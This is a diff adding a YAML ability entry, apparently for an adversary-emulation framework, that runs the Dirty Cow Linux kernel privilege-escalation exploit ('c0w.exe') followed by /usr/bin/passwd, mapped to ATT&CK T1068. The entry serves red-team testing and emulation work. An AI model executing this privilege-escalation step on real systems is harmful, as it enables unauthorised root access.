@@ -1,0 +1,15 @@
+- id: c3308c18-5980-42cc-986e-d50f8cdc51d8
+  name: Dirty Cows exploit
+  description: Exploits race condition in Linux Kernel
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1068
+    name: EXploitation for Privilege Escalation.
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./c0w.exe;
+          /usr/bin/passwd
+        payloads:
+        - c0w.exe
